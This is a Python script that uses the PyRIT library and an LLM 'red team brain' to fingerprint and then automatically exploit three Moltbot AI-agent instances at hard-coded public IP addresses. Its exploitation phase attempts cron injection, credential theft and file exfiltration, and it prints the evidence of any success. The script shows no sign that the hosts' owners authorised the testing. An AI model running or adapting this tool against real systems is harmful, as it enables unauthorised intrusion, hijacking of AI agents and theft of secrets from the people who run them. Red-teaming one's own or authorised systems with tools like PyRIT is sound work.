#!/usr/bin/env python3
"""
Test Multiple Moltbot Instances - Lean Version

This will test three different Moltbot endpoints using your Azure OpenAI
as the red team brain to detect and exploit vulnerabilities.
"""

import asyncio
import os

from pyrit.memory import CentralMemory, SQLiteMemory
from pyrit.prompt_target import OpenAIChatTarget, HTTPTarget
from pyrit.executor.attack.orchestrator.moltbot_orchestrator import MoltbotAttackOrchestrator


# Test targets
MOLTBOT_ENDPOINTS = [
    ("Moltbot 1", "47.254.204.223:18789"),
    ("Moltbot 2", "47.254.198.161:18789"),
    ("Moltbot 3", "47.254.214.11:18789"),
]


async def test_moltbot_endpoint(name: str, host: str, red_team_brain: OpenAIChatTarget):
    """Test a single Moltbot endpoint."""
    
    print(f"\n{'='*70}")
    print(f"Testing {name}: http://{host}/chat?session=main")
    print(f"{'='*70}")
    
    # Initialize the Moltbot target
    http_request = f"""POST /chat?session=main HTTP/1.1
Host: {host}
Content-Type: application/json

{{"message": "{{PROMPT}}"}}"""
    
    moltbot_target = HTTPTarget(
        http_request=http_request,
        prompt_regex_string="{PROMPT}",
        use_tls=False,  # HTTP not HTTPS
    )
    
    # Create orchestrator
    orchestrator = MoltbotAttackOrchestrator(
        red_team_brain=red_team_brain,
        target=moltbot_target,
        verbose=False,  # Less verbose for multiple tests
    )
    
    print("\n🔍 DETECTION PHASE")
    print("Sending fingerprinting probes...\n")
    
    is_moltbot = await orchestrator.detect_moltbot_async()
    
    if is_moltbot:
        print(f"  ✅ Result: 🚨 MOLTBOT DETECTED!")
        print(f"  Vulnerabilities: {orchestrator._detected_vulnerabilities}")
        
        print("\n⚔️  EXPLOITATION PHASE")
        print("Executing attacks...\n")
        
        # Run full exploitation
        result = await orchestrator.auto_exploit_async(
            objective="Test all known Moltbot vulnerabilities"
        )
        
        print("\n📊 RESULTS:")
        
        if result.get('results'):
            attack_results = result['results']
            
            if 'cron_injection' in attack_results:
                cron = attack_results['cron_injection']
                print(f"  🎯 Cron Injection: {cron['outcome']}")
                if cron['outcome'] == 'success':
                    print(f"     Evidence: {cron['evidence'][:100]}...")
            
            if 'credential_theft' in attack_results:
                cred = attack_results['credential_theft']
                print(f"  🔑 Credential Theft: {cred['outcome']}")
                if cred['outcome'] == 'success':
                    print(f"     Evidence: {cred['evidence'][:100]}...")
            
            if 'file_exfiltration' in attack_results:
                files = attack_results['file_exfiltration']
                print(f"  📁 File Exfiltration: {files['outcome']}")
                if files['outcome'] == 'success':
                    print(f"     Evidence: {files['evidence'][:100]}...")
        
        print("\n  ⚠️  CRITICAL: This instance is VULNERABLE!")
    else:
        print(f"  ✅ Result: Not vulnerable Moltbot")
        print("  No exploitation attempted.")
    
    return is_moltbot


async def test_all_moltbots():
    """Test all Moltbot endpoints."""
    
    # Your Azure OpenAI configuration (the brain)
    azure_endpoint = os.getenv("AZURE_OPENAI_ENDPOINT", "https://your-azure-openai.openai.azure.com")
    azure_key = os.getenv("AZURE_OPENAI_KEY")
    azure_deployment = os.getenv("AZURE_OPENAI_DEPLOYMENT", "gpt-4")
    
    if not azure_key:
        print("ERROR: Set AZURE_OPENAI_KEY environment variable")
        print("Example: export AZURE_OPENAI_KEY='your-key-here'")
        return
    
    # Initialize PyRIT memory
    print("Initializing PyRIT memory...")
    memory = SQLiteMemory()
    CentralMemory.set_memory_instance(memory)
    
    print(f"\n{'='*70}")
    print("MOLTBOT SECURITY TESTING - LEAN VERSION")
    print(f"{'='*70}")
    print(f"\nRed Team Brain: {azure_deployment} @ {azure_endpoint}")
    print(f"Testing {len(MOLTBOT_ENDPOINTS)} endpoints...")
    
    # Initialize your Azure OpenAI as the red team brain
    red_team_brain = OpenAIChatTarget(
        model_name=azure_deployment,
        endpoint=azure_endpoint,
        api_key=azure_key,
    )
    
    # Test each endpoint
    results = []
    for name, host in MOLTBOT_ENDPOINTS:
        try:
            is_vulnerable = await test_moltbot_endpoint(name, host, red_team_brain)
            results.append((name, host, is_vulnerable))
        except Exception as e:
            print(f"\n  ❌ ERROR testing {name}: {e}")
            results.append((name, host, None))
    
    # Summary
    print(f"\n{'='*70}")
    print("SUMMARY")
    print(f"{'='*70}\n")
    
    vulnerable_count = sum(1 for _, _, v in results if v is True)
    safe_count = sum(1 for _, _, v in results if v is False)
    error_count = sum(1 for _, _, v in results if v is None)
    
    for name, host, is_vulnerable in results:
        status = "🚨 VULNERABLE" if is_vulnerable else "✓ Safe" if is_vulnerable is False else "❌ Error"
        print(f"  {name} (http://{host}): {status}")
    
    print(f"\n  Total Tested: {len(results)}")
    print(f"  Vulnerable: {vulnerable_count}")
    print(f"  Safe: {safe_count}")
    print(f"  Errors: {error_count}")
    
    # Cleanup
    print("\nCleaning up...")
    memory.dispose_engine()
    
    print("\n✅ All tests complete!")


if __name__ == "__main__":
    print("\n[*] Starting Moltbot Security Testing Suite...")
    print("[*] Testing 3 endpoints with lean implementation\n")
    asyncio.run(test_all_moltbots())
